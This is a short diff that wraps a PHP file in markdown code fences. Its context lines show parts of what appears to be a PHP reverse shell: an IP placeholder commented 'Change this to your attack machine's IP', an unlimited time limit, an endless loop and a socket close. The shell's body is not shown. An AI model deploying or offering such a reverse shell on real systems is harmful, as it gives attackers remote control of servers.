@@ -1,3 +1,4 @@
+```php
 <?php
 set_time_limit(0);
 $ip = "YOUR_IP";  // Change this to your attack machine's IP
@@ -42,3 +43,4 @@ while (true) {
 
 fclose($socket);
 ?>
+```
